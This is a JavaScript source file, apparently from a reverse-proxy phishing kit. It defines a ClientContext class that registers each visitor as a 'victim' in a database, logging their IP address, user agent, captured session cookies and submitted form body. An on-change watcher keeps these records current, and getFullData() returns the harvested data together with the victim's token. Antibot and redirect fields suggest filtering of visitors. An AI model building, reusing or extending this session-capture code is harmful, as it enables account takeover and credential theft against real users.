const { EventEmitter } = require('eventemitter3');
const net = require('net');
const superagent = require('superagent');
const urlParse = require('url-parse')
const onChange = require('on-change')


// const msgPack = require('@msgpack/msgpack')

const ipcVars = require('../forward/ipc/ipcvars')
const gEvent = require('./gevents')
const logger = require('./logger')
const webConfig = require('../webconfig')
const trafficDatabase = require('../db/traffic')
const VictimModel = require('../auto/VcCapture')



class ClientContext {
    constructor(key) {
        this.ev = new EventEmitter();
        gEvent(this.ev)
        this.key = key
                
        this.scheme = 'xxx'
        this.info = { cookieSent: false, processFinished: false }


        this.cipherShift = Math.floor(Math.random() * (2 - 2 + 1) + 2)

        /** Empty Vars */
        this.ip = ''
        this.userAgent = ''
        this.deviceType = 'Unknown';
        this.trafficID = ''
        this.redirect = {}
        this.antibot = {}
        this.allowVisitor = true
        this.isp = ''
        this.hostname = ''
        this.location = ''  
        this.description = ''  
        this.hasExited = false
        
        this.setConfigData()

    }

    setConfigData() {
       // eslint-disable-next-line import/no-dynamic-require, global-require
       let configExport;
        
       
       if(webConfig.projectConfigs.hasOwnProperty(process.env.CURRENT_PROJECT)) {
            
            configExport = webConfig.projectConfigs[process.env.CURRENT_PROJECT]
        } else {
            // custom project
            configExport = require(`${process.env.CURRENT_PROJECT}/main`)
        } 
       this.baseDomain = configExport.CURRENT_DOMAIN;
       this.currentDomain = configExport.CURRENT_DOMAIN;
       this.startPath = configExport.START_PATH;

    }

    // getNextAction(cBack) {

    //     VictimModel.findOne({ key: this.key },
    //         (err, victim) => {
    //             if (err) {
    //                 logger.error(err)
    //             }
    //             if (!victim) {
    //                 logger.error(`Failed to update the victim with the current key${this.key}`)
    //             }
    //             if (victim.length < 1) {

    //                 cBack(false, {})
    //             } else {
    //                 const actionQ = victim.actionQueue
    //                 const actionObj = actionQ.shift()
    //                 victim.actionQueue = actionQ
    //                 victim.save((err) => {
    //                     if (err) {
    //                         logger.warn('Failed to save victim after pulling action')   
    //                     }
    //                     cBack(false, actionObj)
    //                 })
    //             }
    //         })
            
    // }

    setWatcher() {
        const self = this
        this.watchedObject = onChange(
            {
                isActive: false,
                hasExited: false,
                sessionBody: {},
                logAvailable: false,
                actionDB: {},
                currentPage: process.env.START_PATH,
                sessionCookies: [],
            }, (path, value, previousValue, applyData) => {

                let updateQ
                if (path.startsWith('sessionBody.')) {
                    trafficDatabase.updateTrafficLogInformation(this.trafficID, path, value)
                    updateQ = { $set: { [path]: value } }
                } else if (path === 'sessionCookies') {
                    updateQ = { $push: { [path]: value } }
                } else {
                    updateQ = { $set: { [path]: value } }
                }

                VictimModel.findOneAndUpdate({ key: this.key }, updateQ,
                { new: true }, (err, victim) => {
                    if (err) {
                        logger.error(err)
                    }
                    if (!victim) {
                        logger.error(`Failed to update the victim with the current key${this.key}`)
                    }
                })
                
               
            },
        );


        this.setExitStatus = () => {
            logger.info('Client has finished and is exiting...')
            this.watchedObject.hasExited = true;
            this.hasExited = true;
        }

        this.setLogAvailable = (value) => {
            if (value === this.watchedObject.logAvailable) {
                console.log(`Value for LogAvailable Unchnaged from ${this.watchedObject.logAvailable}`)
            } else {
                this.watchedObject.logAvailable = value
            }
        }
        this.setIsActive = (value) => {

            if (value === this.watchedObject.isActive) {
                console.log(`Value for IsActive Unchnaged from ${this.watchedObject.isActive}`)
            } else {
                this.watchedObject.isActive = value
                this.isActive = value;
            }
        }
        this.currentPage = this.watchedObject.currentPage
        this.sessionCookies = this.watchedObject.sessionCookies
        this.sessionBody = this.watchedObject.sessionBody

    }

    getEventEmitter() {
        return this.ev
    }

    loadData(req, cBack) {
        this.hostname = req.host
        const pstUrlObj = urlParse(req.url, true).query
        // const fingerprint = pstUrlObj.fp


        // eslint-disable-next-line dot-notation
        if (req.headers['accept'] === 'application/json') {
            const forwarded = req.headers['x-forwarded-for'] 
            const realIp = forwarded ? forwarded.split(/, /)[0] : req.connection.remoteAddress
            this.ip = req.headers['qrc-ip'] || realIp
            this.userAgent = req.headers['qrc-ua'] || req.headers['user-agent']

        } else {
            const forwarded = req.headers['x-forwarded-for']
            this.ip = forwarded ? forwarded.split(/, /)[0] : req.connection.remoteAddress
            this.userAgent = req.headers['user-agent']
        }
    
        if (!this.ip) {
            this.ip = '8.8.8.8'
        }
        
        if (this.ip.startsWith('::ffff:')) {
            // eslint-disable-next-line prefer-destructuring
            this.ip = this.ip.split('::ffff:')[1]
        }
        
        // this.currentPage = this.req.url

        
    
        this.deviceType = 'STUB!'
        logger.debug(`Lookup up new client user agent ${this.ip}`)

        return this.syncClient((status) => {
            cBack(status)
        })

        
     
        // this.registerSocket()
    }


    syncClient(cBack) {
        this.currentPage = process.env.START_PATH
        // trafficDatabase.installNewTraffic(this)
        this.installIntoDb(() => {
            logger.info('Successfully Registered new client to the page')
            cBack(true)
        })
    }

    installIntoDb(cBack) {
        VictimModel.findOne({ managerID: process.env.MANAGER_ID, key: this.key }, 
            (err, existingVictim) => {
            if (err) {
                logger.error(err)
            }
            if (existingVictim) {
                logger.info('Victim Exists but uses original token Why?')
                this.setWatcher()
                cBack()
            } else {
                const victim = new VictimModel({
                    managerID: process.env.MANAGER_ID,
                    key: this.key,
                    hostname: this.hostname,
                    logAvailable: false,
                    ip: this.ip,
                    hasExited: this.hasExited,
                    userAgent: this.userAgent,
                    deviceType: this.deviceType,
                    location: this.location,
                    currentPage: this.currentPage,
                    sessionCookies: this.sessionCookies,
                    sessionBody: this.sessionBody,
                })

                victim.save((err) => {
                    if (err) {
                        console.error(err);
                    }
                    logger.info('Saved Victim To DB. OK!')
                    this.setWatcher()
                    cBack()
                })
            }
        })
            

    }

    getFullData() {
        return {
            token: this.key,
            location: this.location,
            cookies: this.sessionCookies,
            body: this.sessionBody,
            ip: this.ip,
            ua: this.userAgent,

        }
    }

    onCookieSent() {

    }

    onExited() {

    }


}

module.exports = ClientContext